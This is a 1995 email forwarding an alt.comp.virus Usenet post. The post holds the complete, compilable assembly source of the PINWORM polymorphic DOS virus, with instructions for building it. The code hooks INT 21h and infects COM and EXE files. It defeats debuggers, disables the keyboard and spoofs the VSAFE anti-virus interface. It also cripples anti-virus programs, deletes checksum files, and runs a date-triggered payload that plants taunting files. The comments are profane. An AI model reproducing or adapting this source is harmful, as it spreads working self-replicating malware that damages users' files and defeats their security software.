From smtp Thu Jan 26 14:38 EST 1995
Received: from ids.net by POBOX.jwu.edu; Thu, 26 Jan 95 14:38 EST
Date: Thu, 26 Jan 1995 14:06:40 -0500 (EST)
From: ids.net!JOSHUAW (JOSHUAW)
To: pobox.jwu.edu!joshuaw 
Content-Length: 23717
Content-Type: binary
Message-Id: <950126140640.868d@ids.net>
Status: RO

To: joshuaw@pobox.jwu.edu
Subject: (fwd) PINWORM.ASM
Newsgroups: alt.comp.virus

Path: paperboy.ids.net!uunet!nntp.crl.com!crl5.crl.com!not-for-mail
From: yojimbo@crl.com (Douglas Mauldin)
Newsgroups: alt.comp.virus
Subject: PINWORM.ASM
Date: 23 Jan 1995 23:31:03 -0800
Organization: CRL Dialup Internet Access	(415) 705-6060  [Login: guest]
Lines: 976
Message-ID: <3g2abn$b7a@crl5.crl.com>
NNTP-Posting-Host: crl5.crl.com
X-Newsreader: TIN [version 1.2 PL2]

;Someone posted somewhere that they needed the pinworm's source code so here
;it is compliments of THe QUaRaNTiNE: 

;  compile like so:
;   TASM /m pinworm
;   Tlink pinworm
;   --convert to COM--
;

cseg	segment
	assume	cs: cseg, ds: cseg, es: cseg, ss: cseg

; conditional compilation..
SECOND_CRYPT equ 1                      ; use second cryptor?
XTRA_SPACE   equ 1                      ; xtra space to prevent double cryptor?
INCLUDE_INT3 equ 1                      ; include INT 3 in garbage code?
                                        ; (slows the loop down alot)
KILL_AV      equ 1                      ; Kill AVs as executed?
KILL_CHKLIST equ 1                      ; Kill MSAV/CPAV checksum filez?


; thingz to change..
kill_date    equ   19                   ; day of the month to play with user
max_exe      equ 4                      ; max exe file size -high byte
msg_filez    equ 17                     ; number of filenames for our msg

; polymorphic engine options..
inc_buf_size equ 20                     ; INC buf
enc_op_bsize equ 36                     ; ENC buf
ptr_buf_size equ 36                     ; PTR buf
cnt_buf_size equ 36                     ; CNT&OP
dj_buf_size  equ 36                     ; DEC&JMP
loop_disp_size equ 20                   ; loop buf range
;compile and change the below equate to the second byte of the JNZ operand
org_loop equ    8Dh                     ; original JNZ offset


signal       equ 0FA01h                 ; AX=signal/INT 21h/installation chk
vsafe_word   equ 5945h                  ; magic word for VSAFE/VWATCH API
enc_size equ	offset first_crypt-offset encrypt
enc2_size equ	offset code_start-offset first_crypt
real_start equ	offset dj_buf+3		; starting location of encryted code


org	0h				; hellacious EXE offset calcs if !0
start:

;---- Encryptor/Decryptor Location
; Each opcode has predefined ranges to move within - once the opcode is
; determined, it is placed at the decided location within the buffer.
; 0 bytes constant
;
	encrypt:
	ptr_buf	db ptr_buf_size-3 dup (90h)
	db	0BEh
	dw	real_start+100h
	encryptor:
	cnt_buf	db cnt_buf_size-3 dup(90h)
	db	0B8h			; AX:b8
        dw      offset vend-offset dj_buf
	enc_loop:
	loop_disp db loop_disp_size dup(90h)
	inc_buf	db inc_buf_size dup(90h)
	enc_op_buf db enc_op_bsize dup(90h)
	misc_buf dw 9090h
	word_inc db 90h
	dj_buf	db dj_buf_size-3 dup (90h)
	dec	ax
	jnz	enc_loop		; for orig. only
	ret_byte db 090h		; C3h or a NOP equiv.
first_crypt: 				; end of first cryptor


;---- Second encryptor
; Whose only purpose is to tear the shit out of debuggers. It obviously
; isn't invincible, but will at least keep the lamerz and ignorant morons
; like Patti Hoffman out of the code.
;
; _ Uses reverse direction word XOR encryption
; _ Uses the following techniques:
;    _ JMP into middle of operand
;    _ Replace word after CALL to kill stepping over call
;    _ Kills INT 1 vector
;    _ Disables Keyboard via Port 21h
;    _ Reverse direction encryption prevents stepping past loop
;    _ Uses SP as a crucial data register in some locations - if
;      the debugger uses the program's stack, then it may very well
;      phuck thingz up nicely.
;    _ Uses Soft-Ice INT 3 API to lock it up if in memory.
;
	sti				; fix CLI in garbage code
	db	0BDh			; MOV BP,XXXX
bp_calc	dw	0100h
        push    ds es                   ; save segment registers for EXE
IF SECOND_CRYPT
        push    ds
dbg1:	jmp	mov_si			; 1
	db	0BEh			; MOV SI,XXXX
mov_si:	db	0BEh			; MOV SI,XXXX
rel2_off dw	offset heap+1000h	; org copy: ptr way out there
	call	shit
add_bp:	int	19h			; fuck 'em if they skipped
	jmp	in_op			; 1
	db	0BAh			; MOV DX,XXXX
in_op:	in	al,21h
	push	ax
	or	al,02
	jmp	kill_keyb		; 1
	db	0C6h
kill_keyb: out	21h,al			; keyboard=off
	call	shit6
past_shit: jmp	dbl_crypt
shit7:
	xor	ax,ax			;null es
	mov	es,ax
	mov	bx,word ptr es: [06]	;get INT 1
	ret
shit:
	mov	word ptr cs: add_bp[bp],0F503h ;ADD SI,BP
	mov	word ptr cs: dec_si[bp],05C17h ;reset our shit sister
	ret
shit2:
	mov	word ptr cs: dec_si[bp],4E4Eh
	mov	word ptr cs: add_bp[bp],19CDh ;reset our shit brother
	call	shit3
	jnc	code_start		;did they skip shit3?
	xor	dx,cx
	ret
	db	0EAh			;JMP FAR X:X
shit4:
        db      0BAh                    ;MOV DX,XXXX
sec_enc	dw	0
        mov     di,4A4Dh                ;prepare for Soft-ice
	ret
shit3:
        mov     ax,911h                 ;soft-ice - execute command
        call    shit4
        stc
	dec	word ptr es: [06]	;2-kill INT 1 vector
        push    si
        mov     si,4647h                ;soft-ice
        int     3                       ;call SI execute - DS:DX-garbage
        pop     si
        ret

shit6:	mov	byte ptr cs: past_shit[bp],0EBh
	out	21h,al			; try turning keyboard off again
	ret

dbl_crypt: 				; main portion of cryptor
	mov	cx,(offset heap-offset ret2_byte)/2+1
	call	shit7
dbl_loop:
	jmp	$+3			; 1
	db	034h			; XOR ...
	call	shit3			; nested is the set DX
	xchg	sp,dx			; xchg SP and DX
	jmp	xor_op			; 1
	db	0EAh			; JMP FAR X:X
xor_op:	xor	word ptr cs: [si],sp	; the real XOR baby..
	xchg	sp,dx			; restore SP
	call	shit2
dec_si:	pop	ss			; fuck 'em if they skipped shit2
	pop	sp
        int     3
	xchg	sp,bx			; SP=word of old int 1 vec
	dec	cx
	mov	es: [06],sp		; restore int 1 vector
	xchg	sp,bx			; restore SP
	jnz	dbl_loop
ret2_byte db	90h,90h

;---- Start of another artificial lifeform

ENDIF
code_start:
IF SECOND_CRYPT
        pop     ax es                   ; Get port reg bits (ES=PSP)
	out	21h,al			; restore keyboard
ENDIF

        mov     cs: activate[bp],0      ; reset activation toggle
	mov	cs: mem_word[bp],0	; reset mem. encryption

	inc	si			; SI!=0
	mov	dx,vsafe_word		; remove VSAFE/VWATCH from memory
	mov	ax,0FA01h		; & check for residency of virus too
	int	21h
	or	si,si			; if SI=0 then it's us
	jz	no_install

	mov	ah,2ah			; get date
	int	21h
	cmp	dl,kill_date		; is it time to activate?
	jnz	not_time
	mov	cs: activate[bp],1

not_time:

	mov	ax,es			; PSP segment   - popped from DS
	dec	ax			; mcb below PSP m0n
	mov	ds,ax			; DS=MCB seg
	cmp	byte ptr ds: [0],'Z'	; Is this the last MCB in chain?
	jnz	no_install
	sub	word ptr ds: [3],(((vend-start+1023)*2)/1024)*64 ; alloc MCB
	sub	word ptr ds: [12h],(((vend-start+1023)*2)/1024)*64 ; alloc PSP
	mov	es,word ptr ds: [12h]	; get high mem seg
	push	cs
	pop	ds
	mov	si,bp
	mov	cx,(offset vend - offset start)/2+1
	xor	di,di
	rep	movsw			; copy code to new seg
	xor	ax,ax
	mov	ds,ax			; null ds
	push	ds
	lds	ax,ds: [21h*4]		; get 21h vector
	mov	es: word ptr old21+2,ds	; save S:O
	mov	es: word ptr old21,ax
	pop	ds
	mov	ds: [21h*4+2],es	; new int 21h seg
	mov	ds: [21h*4],offset new21 ; new offset

	call	get_random
	cmp	dl,5
	jle	no_install
	sub	byte ptr ds: [413h],((offset vend-offset start+1023)*2)/1024 ;-totalmem

no_install:

	xor	si,si			; null regs..
	xor	di,di			; some progs actually care..
	xor	ax,ax
	xor	bx,bx
	xor	dx,dx

	pop	es ds			; restore ES DS
	cmp	cs: exe_phile[bp],1
	jz	exe_return

	lea	si,org_bytes[bp]	; com return
	mov	di,0100h		; -restore first 4 bytes
	movsw
	movsw

	mov	ax,100h			; jump back to 100h
	push	ax
_ret:	ret

exe_return:
	mov	cx,ds			; calc. real CS
	add	cx,10h
	add	word ptr cs: [exe_jump+2+bp],cx
	int	3			; fix prefetch
	cli
	mov	sp,cs: oldsp[bp]	; restore old SP..
	sti
	db	0eah
exe_jump dd	0
oldsp	dw	0
exe_phile db	0

;----------------------------------------------------------
; Infection routine - called from INT 21h handler.
;    DS:DX=fname
;      Assumes EXE if first byte is 'M' or 'Z'
;    Changes/Restores attribute and time/date
;
;  If philename ends in 'AV', 'AN', or 'OT' it's not infected and has it's
;  minimum req. memory in the header (0Ah) changed to FFFFh, thus making it
;  unusable.
;
infect_file:

	mov	di,dx			; move filename ptr into an index reg

	push	ds			; search for end of filename(NULL)
	pop	es
	xor	ax,ax
	mov	cx,128
	repnz	scasb

	cmp	word ptr [di-3],'EX'	;.eXE?
	jz	is_exec
chk_com: cmp	word ptr [di-3],'MO'	;.cOM?
	jnz	_ret
is_exec:
IF KILL_AV
        mov     cs: isav,0
	cmp	word ptr [di-7],'VA'	;*AV.*? CPAV,MSAV,TBAV,TNTAV
	jz	anti_action
	cmp	word ptr [di-7],'TO'	;*OT.*? F-PROT
	jz	anti_action
	cmp	word ptr [di-7],'NA'	;*AN.*?
	jnz	name_ok
	cmp	word ptr [di-9],'CS'	;*SCAN.*?
	jnz	name_ok
anti_action:
	inc	cs: isav		; set mark for anti-virus kill
name_ok:
ENDIF
	push	ds			; save fname ptr segment
	mov	es,ax			; NULL ES  (ax already 0)
	lds	ax,es: [24h*4]		; get INT 24h vector
	mov	old_24_off,ax		; save it
	mov	old_24_seg,ds
	mov	es: [24h*4+2],cs	; install our handler
	mov	es: [24h*4],offset new_24
	pop	ds			; restore fname ptr segment
	push	es
	push	cs			; push ES for restoring INT24h later
	pop	es			; ES=CS

	mov	ax,4300h		; get phile attribute
	int	21h
	mov	ax,4301h		; null attribs 4301h
	push	ax cx ds dx		; save AX-call/CX-attrib/DX:DS
	xor	cx,cx			; zero all
	int	21h

	mov	bx,signal
	mov	ax,3d02h		; open the file
	int	21h
	jc	close			; if error..quit infection

	xchg	bx,ax			; get handle

	push	cs			; DS=CS
	pop	ds

IF KILL_CHKLIST
        call    kill_chklst             ; kill CHKLIST.MS & .CPS filez
ENDIF
	mov	ax,5700h		; get file time/date
	int	21h
	push	cx dx			; save 'em for later

	mov	ah,3fh			; Read first bytes of file
	mov	cx,18h			; EXE header or just first bytes of COM
	lea	dx,org_bytes		; buffer used for both
	int	21h

	call	offset_end		; set ptr to end- DXAX=file_size

	cmp	byte ptr org_bytes,'M'	; EXE?
	jz	do_exe
	cmp	byte ptr org_bytes,'Z'	; EXE?
	jz	do_exe
	cmp	byte ptr org_bytes+3,0	; CoM infected?
	jz	d_time

	dec	exe_phile

	push	ax			; save file size
	add	ax,100h			; PSP in com
	mov	rel_off,ax		; save it for decryptor
	mov	bp_calc,ax

	call	encrypt_code		; copy and encrypt code

	lea	dx,vend			; start of newly created code
	mov	cx,offset heap+0FFh	; virus length+xtra
	add	cl,size_disp		; add random  ^in case cl exceeds FF
	mov	ah,40h
	int	21h			; append virus to infected file

	call	offset_zero		; position ptr to beginning of file

	pop	ax			; restore COM file size
	sub	ax,3			; calculate jmp offset
	mov	word ptr new_jmp+1,ax	; save it..

	lea	dx,new_jmp		; write the new jmp (E9XXXX,0)
	mov	cx,4			; total of 4 bytes
	mov	ah,40h
	int	21h

d_time:

	pop	dx cx			; pop date/time
	mov	ax,5701h		; restore the mother fuckers
	int	21h

close:

	mov	ah,3eh			; close phile
	int	21h

	pop	dx ds cx ax		; restore attrib
	int	21h

dont_do:
	pop	es			; ES=0
	lds	ax,dword ptr old_24_off	; restore shitty DOS error handler
	mov	es: [24h*4],ax
	mov	es: [24h*4+2],ds

	ret				; return back to INT 21h handler

do_exe:
	cmp	dx,max_exe
	jg	d_time

	mov	exe_phile,1

IF KILL_AV
        cmp     isav,1                  ; anti-virus software?
	jnz	not_av
	mov	word ptr exe_header[0ah],0FFFFh ; change min. mem to FFFFh
	jmp	write_hdr
not_av:
ENDIF
	cmp	word ptr exe_header[12h],0 ; checksum 0?
	jnz	d_time

	mov	cx,mem_word		; get random word
	inc	cx			; make sure !0
	mov	word ptr exe_header[12h],cx ; set checksum to!0
	mov	cx,word ptr exe_header[10h] ; get old SP
	mov	oldsp,cx		; save it..
	mov	word ptr exe_header[10h],0 ; write new SP of 0

	les	cx,dword ptr exe_header[14h] ; Save old entry point
	mov	word ptr exe_jump, cx	; off
	mov	word ptr exe_jump[2], es ; seg

	push	cs			; ES=CS
	pop	es

	push	dx ax			; save file size DX:AX
	cmp	byte ptr exe_header[18h],52h ; PKLITE'd? (v1.13+)
	jz	pklited
	cmp	byte ptr exe_header[18h],40h ; 40+ = new format EXE
	jge	d_time
	pklited:

	mov	bp, word ptr exe_header+8h ; calc. new entry point
	mov	cl,4			; *10h
	shl	bp,cl			;  ^by shifting one byte
	sub	ax,bp			; get actual file size-header
	sbb	dx,0
	mov	cx,10h			; divide me baby
	div	cx

	mov	word ptr exe_header+14h,dx ; save new entry point
	mov	word ptr exe_header+16h,ax
	mov	rel_off,dx		; save it for encryptor
	mov	bp_calc,dx

	call	encrypt_code		; encrypt & copy the code

	mov	cx,offset heap+0FFh	; virus size+xtra
	add	cl,size_disp		; add random ^in case cl exceeds FFh
	lea	dx,vend			; new copy in heap
	mov	ah,40h			; write the damn thing
	int	21h

	pop	ax dx			; AX:DX file size

	mov	cx,(offset heap-offset start)+0FFh ; if xceeds ff below
	add	cl,size_disp
	adc	ax,cx

	mov	cl,9			; calc new alloc (512)
	push	ax
	shr	ax,cl
	ror	dx,cl
	stc
	adc	dx,ax
	pop	ax
	and	ah,1

	mov	word ptr exe_header+4h,dx ; save new mem. alloc info
	mov	word ptr exe_header+2h,ax

write_hdr:
	call	offset_zero		; position ptr to beginning

	mov	cx,18h			; write fiXed header
	lea	dx,exe_header
	mov	ah,40h
	int	21h

	jmp	d_time			; restore shit/return


;----------------------------------------------------------
; Kill CHKLIST.* filez by nulling attribs, then deleting
; phile.
;

kill_chklst:
	mov	di,2			; counter for loop
	lea	dx,chkl1		; first fname to kill
kill_loop:
	mov	ax,4301h		; reset attribs
	xor	cx,cx
	int	21h
	mov	ah,41h			; delete phile
	int	21h
	lea	dx,chkl2		; second fname to kill
	dec	di
	jnz	kill_loop

	ret

;----------------------------------------------------------
; set file ptr

offset_zero: 				; self explanitory
	xor	al,al
	jmp	set_fp
offset_end:
	mov	al,02h
set_fp:
	mov	ah,42h
	xor	cx,cx
	xor	dx,dx
	int	21h
	ret

;----------------------------------------------------------
; Morph, copy, & crypt
;
;  0 bytes constant
;  0 operands in constant locations
;
; ms:
;   bit 7
;       6
;       5
;       4  - INCREMENT COUNTER OP
;       3  - 
;       2  - INCREMENT ENCRYPTOR OP
;       1  - ADD&SUB|XOR
;       0  - WORD|BYTE
;      IF<20-SELECTION BETWEEN JNZ AND JNS
;      IF<5-DON'T WRITE ENCRYPTION OPS!
; sec:
;      IF<=5-use constant NOP instead of random
;
encrypt_code:

	push	bx			; save the handle

;---- Fill buffer space with garbage bytes

	lea	di,encrypt		; fill buffer /w it
	mov	bp,enc_size+1
	call	fill_buffer

;---- Randomly select between jmp type : JNZ or JNS

	call	get_random
	mov	enc_num,dl		; store ms count for encryption
	mov	mem_word,dx		; mem cryption too
	mov	size_disp,dl		; and size displacment

	cmp	dl,20h
	jl	jmp_2
	mov	byte ptr jnz_op,75h	; use jnz
	jmp	jmp_set
	jmp_2:
	mov	byte ptr jnz_op,79h	; jns
	jmp_set:

;---- Change jump address

	cmp	byte ptr jnz_op+1,org_loop+loop_disp_size ; JNX on max offset?
	jnz	inc_jmp_ofs		; if not then inc the ptr
	mov	byte ptr jnz_op+1,org_loop ; jump to pos X in buffer
	inc_jmp_ofs:
	inc	byte ptr jnz_op+1	; increment jmp into buffer

;---- Change encryption type randomly between XOR and ADD&SUB

	mov	al,04			; default to encrypting ADD
	mov	enc_type,2Ch		; and decrypting SUB
	test	dl,00000010b		; that bit =1?
	jz	use_add_sub
	mov	al,34h			; encrypting XOR
	mov	enc_type,34h		; decrypting XOR
	use_add_sub:

;--- Change register used for the counter

	cmp	byte ptr count_op,0BBh	; skip SP/BP/DI/SI
	jnz	get_reg
	mov	byte ptr count_op,0B7h	; AX-1
	mov	byte ptr dec_op,47h	; AX-1
	get_reg:
	inc	byte ptr count_op	; increment to next OP
	inc	byte ptr dec_op		; ""

;---- Change position of INC XX

	mov	di,inc_ptr		; get new off for INC XX
	cmp	di,inc_buf_size		; max position?
	jl	good_inc		; if not..then continue
	mov	inc_ptr,0		; use offset 1 next run
	xor	di,di			; use offset 0 this run
	good_inc:
	inc	inc_ptr			; increment the ptr for next

;---- Toggle between SI and DI

	cmp	byte ptr ptr_set,0BEh	; using SI?
	jz	chg_di			; if so, then switch to DI
	mov	byte ptr inc_buf[di],46h ; write INC SI
	dec	byte ptr ptr_set	; decrement to SI
	jmp	done_chg_ptr
	chg_di:
	mov	byte ptr inc_buf[di],47h ; write INC DI
	inc	byte ptr ptr_set	; increment to DI
	inc	byte ptr enc_type	; increment decryptor
	inc	ax			; increment encryptor
	done_chg_ptr:

;---- Select word or byte encryption

	mov	w_b,80h			; default to byte cryption
	test	dl,00000001b		; use word?
	jz	use_byte
	mov	w_b,81h			; now using word en/decryptor
	mov	ch,byte ptr inc_buf[di]	; get INC op
	mov	byte ptr word_inc,ch	; write another one
	use_byte:

;---- Increment counter value

	cmp	byte ptr crypt_bytes,0Fh ; byte count quite large?
	jnz	inc_cnt			; if not..increment away
	mov	crypt_bytes,offset vend	; else..reset byte count
	inc_cnt:
	inc	crypt_bytes		; increment byte count


;---- Set DEC XX /JNS|JNZ operands

	mov	di,dec_op_ptr
	cmp	di,dj_buf_size-2
	jl	good_dec_op
	mov	dec_op_ptr,0
	xor	di,di
	good_dec_op:
	inc	dec_op_ptr
	no_inc_dec_op:
	add	di,offset dj_buf
	lea	si,dec_op
	movsw
	movsb
	inc	di			;word align
	add	rel_off,di		;chg offset for decryption
	push	di			;save offset after jmp

;---- Set MOV DI,XXXX|MOV SI,XXXX

	mov	di,ptr_op_ptr
	cmp	di,ptr_buf_size-3
	jl	good_ptr_op
	mov	ptr_op_ptr,0
	xor	di,di
	good_ptr_op:
	test	dl,00001000b
	jz	no_inc_ptr_op
	inc	ptr_op_ptr
	no_inc_ptr_op:
	add	di,offset ptr_buf
	lea	si,ptr_set
	movsw
	movsb

;---- Set MOV AX|BX|DX|CX,XXXX

	mov	di,count_op_ptr
	cmp	di,cnt_buf_size-3
	jl	good_count_op
	mov	count_op_ptr,0
	xor	di,di
	good_count_op:
	test	dl,00010000b
	jz	no_inc_count_op
	inc	count_op_ptr
	no_inc_count_op:
	add	di,offset cnt_buf
	lea	si,count_op
	movsw
	movsb

;---- Set XOR|ADD&SUB WORD|BYTE CS:|DS:[SI|DI],XX|XXXX

	mov	di,enc_op_ptr
	cmp	di,enc_op_bsize-5
	jl	good_enc_ptr
	mov	enc_op_ptr,0
	xor	di,di
	good_enc_ptr:
	test	dl,00000100b
	jz	no_inc_enc_ptr
	inc	enc_op_ptr
	no_inc_enc_ptr:
	add	di,offset enc_op_buf
	mov	bx,di			; BX points to encrytor pos.
	lea	si,seg_op
	movsw
	movsw

;---- FiX second cryptor offset

IF SECOND_CRYPT
	mov	rel2_off,offset heap	;first gen has mispl. off
ENDIF

;---- Copy virus code along with decryptor to heap

	mov	cx, (offset heap-offset start)/2+1
	xor	si,si
        lea     di,vend                 ; ..to heap for encryption
	rep	movsw			; make another copy of virus

IF SECOND_CRYPT
;---- Call second encryptor first

	mov	si,offset vend		; offset of enc. start..
	add	si,offset heap		; ..at end of code
	mov	ret2_byte,0C3h
	xor	bp,bp
	push	ax bx
	call	dbl_crypt
	pop	bx ax
	mov	ret2_byte,90h
ENDIF

;---- Set ptr to heap for encryption

	pop	si			; pop offset after jmp
	add	si,offset vend		; offset we'z bez encrypting
	mov	di,si			; we might be using DI too

;---- Encrypt the mother fucker

	mov	ret_byte,0C3h		; put RET
	mov	byte ptr [bx+2],al	; set encryption type
	call	encryptor		; encrypt the bitch

	pop	bx			; restore phile handle
	ret				; return

;-----------------------------------------------
; Fill buffer with random garbage from table
;  DI=off BP=size
;  ret: BL=last garbage byte
;
;  Decently random..relies on previously encrypted data and MS from clock
;  to form pointer to the next operand to use..
;
;
fill_buffer:
	add	bl,dl			; previous NOP+previous NOP off
	call	get_random
IF SECOND_CRYPT
        mov     byte ptr sec_enc,cl     ; use CL\DL for 2nd encryptor
	mov	byte ptr sec_enc+1,dh
ENDIF
	cmp	dh,5			; use random NOPs or constant NOP?
	jg	use_rand
	xor	dx,dx
	jmp	constant
use_rand:
	add	dl,byte ptr vend+200h[di] ; encrypted byte somewhere..
	sub	dl,bl
	and	dl,00001111b		; extract lower nibble
	xor	dh,dh
constant: mov	si,dx			; build index ptr
	mov	bl,byte ptr [nops+si]	; get NOP from table
	mov	byte ptr [di],bl
	inc	di			; increment buffer ptr
	dec	bp
	jnz	fill_buffer		; loop
	ret
;--------------------------
; get time man - and use it as semi-random word
;
get_random:
	mov	ah,2ch			; get clock
	int	21h
	ret

;----------------------------------------------------------
; Associated bullshit
;
credits	db	' _ PI_W_rM_v1.00 - Coded by _irogen in April 1994'
chkl1	db	'CHKLIST.MS',0		; MSAV shitty checksum
chkl2	db	'CHKLIST.CPS',0		; CPAV shitty checksum
pin_dir	db	255,'PI_W_rM._g!',0	; DIR created
root	db	'..',0			; for changing to org. dir
file1   db      'I_hope_y',0            ; filez created in dir..
	db	'ou_have_',0		; must be 8 chars each+null
	db	'enjoyed_',0		; (255 not space)
	db	'your_inf',0
	db	'estation',0
	db	'_by_the_',0
	db	'mighty P',0
	db	'inworm p',0
	db	'arasite·',0
	db	'········',0
	db	'Fuck_you',0
	db	'all!____',0
        db      '-_irogen',0            ; #13
new_jmp db      0E9h,0,0,0              ; jmp XXXX ,0 (id)
inc_ptr	dw	0			; ptr to location of INC
enc_op_ptr dw	0			; actual ENC op ptr
ptr_op_ptr dw	0			; ptr to ptr set pos
count_op_ptr dw	0			; ptr to counter reg pos
dec_op_ptr dw	1			; ptr to decrement counter op pos
activate db	0
isav	db	0

seg_op	db	2Eh			; CS
w_b	db	80h			; byte=80h word=81h
enc_type db	2Ch			; SUB BYTE PTR CS:[SI],XXXX ;XOR/34
enc_num	db	0

ptr_set	db	0BEh			; MOV SI,XXXX
rel_off	dw	real_start+100h

count_op db	0B8h			; CX:B9 AX:b8
crypt_bytes dw  offset vend-offset dj_buf

dec_op:	dec	ax			; DEC AX|BX|CX|DX
jnz_op:	db	75h,org_loop

nops:   nop                             ; 1 byte garbage OPs.. must be 16
IF INCLUDE_INT3
        int     3
ELSE
        cld
ENDIF
	into
	inc	bp
	dec	bp
	cld
	nop
	stc
	cmc
	clc
	stc
	into
	cli
	sti
	inc	bp
IF INCLUDE_INT3
        int     3
ELSE
        nop
ENDIF


;----------------------------------------------------------
; activation routine
;
act_routine:
	push	ax bx cx ds dx bp es cs
	pop	ds
	mov	activate,0		;we're in work now..
	lea	dx,pin_dir		;create our subdirectory
	mov	ah,39h
	int	21h
	mov	ah,3bh			;change to our new subdirectory
	int	21h

	lea	dx,file1		;offset of first filename
	mov	bp,msg_filez		;# of filez total
make_msg:
	xor	cx,cx			;null attribs
	mov	ah,3ch
	int	21h			;create phile
	jc	dont_close
	xchg	ax,bx
	mov	ah,3eh			;close phile
	int	21h
dont_close: add	dx,9			;point to next phile
	dec	bp
	jnz	make_msg

	lea	dx,root			; change back to orginal dir
	mov	ah,3bh
	int	21h

	cmp	r_delay,5		;5 calls?
	jl	r_no			;if not then skip keyboard ror
	mov	r_delay,-1
	xor	ax,ax			;es=null
	mov	es,ax
	ror	word ptr es: [416h],1	;rotate keyboard flags
r_no:
	inc	r_delay			;increment calls count
	mov	activate,1
	pop	es bp dx ds cx bx ax
	jmp	no_act

;-------------------------------------------------------
; Interrupt 24h - critical error handler
;
new_24:					; critical error handler
	mov	al,3			; prompts suck, return fail
	iret

;---------------------------------------------------------
; In-memory encryption function
;  **virus encrypted in memory up to this point**
;
mem_crypt:
	mov	cx,offset mem_crypt-offset code_start
	xor	di,di			;offset 0
mem_loop:
	db	2Eh,81h,35h		;CS:XOR WORD PTR [DI],
mem_word dw	0			;XXXX
	inc	di
	loop	mem_loop
	ret

;----------------------------------------------------------
; Interrupt 21h
;  returns SI=0 and passes control to normal handler if
;   VSAFE uninstall command is recieved.
;
new21:
	pushf

	cmp	cs: activate,1		; time to activate?
	jnz	no_act
	cmp	ah,0Bh
	jl	act_routine
no_act:
	cmp	ax,signal		; be it us?
	jnz	not_us			; richtig..
	cmp	dx,vsafe_word
	jnz	not_us
	xor	si,si			; tis us
	mov	di,4559h		; simulate VSAFE return
not_us:
	cmp	ah,4bh			; execute phile?
	jnz	jmp_org

go_now:	push	ax bp bx cx di dx ds es si
	call	mem_crypt		; decrypt in memory
	call	infect_file		; the mother of all calls
	call	mem_crypt		; encrypt in memory
	pop	si es ds dx di cx bx bp ax

	jmp_org:
	popf
	db	0eah			; jump far
	old21	dd 0			; O:S


exe_header:
org_bytes db	0CDh,20h,0,0		; original COM bytes | exe hdr
;---- Start of heap (not written to disk)
heap:
db	14h	dup(0)			; remaining exe header space
old_24_off dw	0			; old int24h vector
old_24_seg dw	0
r_delay	db	0
size_disp db	0			; additional size of virus
IF XTRA_SPACE
db      0DDh    dup(0)                  ; xtra space for random write
					; otherwise decryptor will be
					; written twice - could make it
					; vulnerable
ENDIF
vend:					; end of virus in memory..
cseg	ends
	end	start


